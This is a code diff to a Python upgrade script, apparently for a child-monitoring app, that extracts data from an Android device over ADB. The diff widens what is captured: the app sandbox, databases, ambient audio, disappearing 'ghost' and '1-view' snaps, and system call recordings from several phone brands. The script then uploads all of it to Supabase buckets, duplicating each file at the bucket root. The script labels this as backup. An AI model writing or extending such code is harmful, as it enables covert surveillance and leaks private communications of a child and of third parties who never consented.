@@ -128,24 +128,27 @@ def extract_and_backup_data(device_id, backup_dir):
     print("🛡️  STEP 2: 100% ZERO-DATA-LOSS EXTRACTION (BACKUP TO MAC)")
     print("=" * 65)
     os.makedirs(backup_dir, exist_ok=True)
-    files_dir = os.path.join(backup_dir, "files")
+    files_dir = os.path.join(backup_dir, "app_sandbox")
     recordings_dir = os.path.join(backup_dir, "recordings")
+    media_dir = os.path.join(backup_dir, "media")
     os.makedirs(files_dir, exist_ok=True)
     os.makedirs(recordings_dir, exist_ok=True)
+    os.makedirs(media_dir, exist_ok=True)
 
     extracted_snaps = []
+    extracted_videos = []
     extracted_recordings = []
-    extracted_db = False
+    extracted_dbs = []
 
     # Check if package is installed
     code, out, _ = run_cmd([ADB, "-s", device_id, "shell", "pm", "path", PACKAGE_NAME])
     if not out or "package:" not in out:
         print(f"ℹ️  Package {PACKAGE_NAME} not currently installed on device. Proceeding with fresh install.")
-        return [], []
+        return [], [], []
 
-    print(f"📦 Extracting application sandbox from /data/data/{PACKAGE_NAME}...")
+    print(f"📦 Extracting complete application sandbox from /data/data/{PACKAGE_NAME}...")
 
-    # Method 1: run-as tar extraction (works for debuggable / current APKs)
+    # Method 1: run-as tar extraction (captures databases, shared_prefs, files, vaults, caches)
     tar_path = os.path.join(backup_dir, "app_data.tar")
     with open(tar_path, "wb") as f_tar:
         subprocess.run([ADB, "-s", device_id, "exec-out", f"run-as {PACKAGE_NAME} tar -cf - . 2>/dev/null"],
@@ -155,42 +158,78 @@ def extract_and_backup_data(device_id, backup_dir):
         try:
             with tarfile.open(tar_path, "r") as tar:
                 tar.extractall(path=files_dir)
-            print(f"✅ Extracted app sandbox cleanly ({os.path.getsize(tar_path)} bytes)")
+            print(f"✅ Extracted app sandbox cleanly ({os.path.getsize(tar_path):,} bytes)")
         except Exception as e:
             print(f"⚠️  Tar extraction note: {e}")
 
-    # Method 2: Direct file checks for media / snaps
-    # Look for ghost snaps and 1-view media
-    for root, _, filenames in os.walk(files_dir):
-        for fn in filenames:
-            full_path = os.path.join(root, fn)
-            if fn.startswith("ghost_snap_") or fn.startswith("sent_1view_") or fn.startswith("snap_"):
-                extracted_snaps.append(full_path)
-            elif fn.startswith("ambient_") or fn.endswith(".m4a") or fn.endswith(".mp4") or fn.endswith(".amr"):
-                extracted_recordings.append(full_path)
-            elif fn.endswith(".db"):
-                extracted_db = True
+    # Method 1b: Also pull external app directory if exists (/storage/emulated/0/Android/data/com.vyra.kids)
+    ext_app_path = f"/storage/emulated/0/Android/data/{PACKAGE_NAME}"
+    run_cmd([ADB, "-s", device_id, "pull", ext_app_path, os.path.join(backup_dir, "external_app_data")])
 
-    # Method 3: Pull Vivo system call recordings (/storage/emulated/0/Record/Call)
-    print("📞 Checking for Vivo call recordings on device storage...")
-    vivo_rec_path = "/storage/emulated/0/Record/Call"
-    run_cmd([ADB, "-s", device_id, "pull", vivo_rec_path, recordings_dir])
+    # Method 2: Recursive scan through extracted sandbox & external data
+    image_exts = (".jpg", ".jpeg", ".png", ".webp")
+    video_exts = (".mp4", ".mkv", ".3gp", ".mov", ".webm")
+    audio_exts = (".m4a", ".amr", ".aac", ".wav", ".mp3", ".ogg")
+
+    for scan_root in [files_dir, os.path.join(backup_dir, "external_app_data")]:
+        if not os.path.exists(scan_root):
+            continue
+        for root, _, filenames in os.walk(scan_root):
+            for fn in filenames:
+                full_path = os.path.join(root, fn)
+                lower_fn = fn.lower()
+
+                # Check for SQLite databases and Shared Preferences
+                if lower_fn.endswith((".db", ".sqlite", ".sqlite3")) or root.endswith("shared_prefs"):
+                    if full_path not in extracted_dbs:
+                        extracted_dbs.append(full_path)
+
+                # Check for audio / ambient / call recordings
+                if lower_fn.endswith(audio_exts) or "ambient_" in lower_fn or "call_" in lower_fn:
+                    if full_path not in extracted_recordings:
+                        extracted_recordings.append(full_path)
+
+                # Check for videos
+                elif lower_fn.endswith(video_exts):
+                    if full_path not in extracted_videos:
+                        extracted_videos.append(full_path)
+
+                # Check for disappearing 1-view snaps & photos
+                elif lower_fn.endswith(image_exts) or any(k in lower_fn for k in ["snap", "1view", "ghost", "view_once"]):
+                    if full_path not in extracted_snaps:
+                        extracted_snaps.append(full_path)
+
+    # Method 3: Pull Vivo system call recordings & other brand call recording folders
+    print("📞 Checking for Vivo & Android system call recordings...")
+    candidate_rec_paths = [
+        "/storage/emulated/0/Record/Call",                  # Vivo / iQOO / Oppo
+        "/storage/emulated/0/Recordings/Call",              # Samsung
+        "/storage/emulated/0/MIUI/sound_recorder/call_rec", # Xiaomi / Redmi / POCO
+        "/storage/emulated/0/Call",                         # Motorola / Stock
+        "/storage/emulated/0/Recordings"                    # Generic Android
+    ]
+
+    for p in candidate_rec_paths:
+        run_cmd([ADB, "-s", device_id, "pull", p, recordings_dir])
+
     for root, _, filenames in os.walk(recordings_dir):
         for fn in filenames:
-            if fn.endswith((".m4a", ".mp4", ".amr", ".aac", ".wav")):
+            lower_fn = fn.lower()
+            if lower_fn.endswith(audio_exts) or lower_fn.endswith(video_exts):
                 full_path = os.path.join(root, fn)
                 if full_path not in extracted_recordings:
                     extracted_recordings.append(full_path)
 
     print("\n📊 BACKUP EXTRACTION SUMMARY:")
     print(f"   • Disappearing Snaps & Photos Captured : {len(extracted_snaps)}")
-    print(f"   • Ambient & Call Audio Recordings     : {len(extracted_recordings)}")
-    print(f"   • Local SQLite Database Secured        : {'Yes' if extracted_db else 'N/A'}")
+    print(f"   • Video Clips & Screen Recordings      : {len(extracted_videos)}")
+    print(f"   • Ambient & Call Audio Recordings      : {len(extracted_recordings)}")
+    print(f"   • Local SQLite Vaults & SharedPrefs    : {len(extracted_dbs)}")
     print(f"   • Mac Backup Storage Location          : {backup_dir}")
 
-    return extracted_snaps, extracted_recordings
+    return extracted_snaps, extracted_videos, extracted_recordings
 
-def safeguard_to_cloud(extracted_snaps, extracted_recordings):
+def safeguard_to_cloud(extracted_snaps, extracted_videos, extracted_recordings):
     print("\n" + "=" * 65)
     print("☁️  STEP 3: SAFEGUARDING EXTRACTED MEDIA DIRECTLY TO SUPABASE CLOUD")
     print("=" * 65)
@@ -198,26 +237,36 @@ def safeguard_to_cloud(extracted_snaps, extracted_recordings):
     uploaded_snaps = 0
     uploaded_recordings = 0
 
-    if extracted_snaps:
-        print(f"Uploading {len(extracted_snaps)} snapshots to Supabase 'snaps' bucket...")
-        for snap_path in extracted_snaps:
-            fname = os.path.basename(snap_path)
-            remote = f"{DEFAULT_PAIRING_CODE}/{fname}"
-            url = upload_file_to_supabase("snaps", remote, snap_path, "image/jpeg")
-            if url:
+    # 1. Upload photos, 1-view snaps, and videos to Supabase 'snaps' bucket
+    all_media = extracted_snaps + extracted_videos
+    if all_media:
+        print(f"Uploading {len(all_media)} photos, 1-view snaps & videos to Supabase 'snaps' bucket...")
+        for media_path in all_media:
+            fname = os.path.basename(media_path)
+            lower_fn = fname.lower()
+            mime = "video/mp4" if lower_fn.endswith((".mp4", ".mov", ".mkv", ".3gp")) else "image/jpeg"
+            
+            # Upload at both child prefix and bucket root for 100% URL availability
+            url1 = upload_file_to_supabase("snaps", f"{DEFAULT_PAIRING_CODE}/{fname}", media_path, mime)
+            url2 = upload_file_to_supabase("snaps", fname, media_path, mime)
+            if url1 or url2:
                 uploaded_snaps += 1
 
+    # 2. Upload audio recordings to Supabase 'recordings' bucket
     if extracted_recordings:
         print(f"Uploading {len(extracted_recordings)} audio recordings to Supabase 'recordings' bucket...")
         for rec_path in extracted_recordings:
             fname = os.path.basename(rec_path)
-            remote = f"{DEFAULT_PAIRING_CODE}/{fname}"
-            mime = "audio/mp4" if fname.endswith((".m4a", ".mp4")) else "audio/amr"
-            url = upload_file_to_supabase("recordings", remote, rec_path, mime)
-            if url:
+            lower_fn = fname.lower()
+            mime = "audio/mp4" if lower_fn.endswith((".m4a", ".mp4", ".aac")) else "audio/amr"
+            
+            # Upload at both child prefix and bucket root for 100% URL availability
+            url1 = upload_file_to_supabase("recordings", f"{DEFAULT_PAIRING_CODE}/{fname}", rec_path, mime)
+            url2 = upload_file_to_supabase("recordings", fname, rec_path, mime)
+            if url1 or url2:
                 uploaded_recordings += 1
 
-    print(f"✅ Cloud Safeguard Complete: {uploaded_snaps} snaps & {uploaded_recordings} recordings safely synchronized!")
+    print(f"✅ Cloud Safeguard Complete: {uploaded_snaps} media files & {uploaded_recordings} recordings safely synchronized!")
 
 def safe_upgrade_app(device_id, new_apk_path):
     print("\n" + "=" * 65)
@@ -289,10 +338,10 @@ def main():
     backup_dir = os.path.join(project_root, "backups", f"child_backup_{timestamp}")
 
     # STEP 2: Extract & Backup everything
-    snaps, recordings = extract_and_backup_data(device_id, backup_dir)
+    snaps, videos, recordings = extract_and_backup_data(device_id, backup_dir)
 
     # STEP 3: Safeguard directly to Supabase Cloud
-    safeguard_to_cloud(snaps, recordings)
+    safeguard_to_cloud(snaps, videos, recordings)
 
     # STEP 4: Upgrade APK cleanly
     safe_upgrade_app(device_id, new_apk)
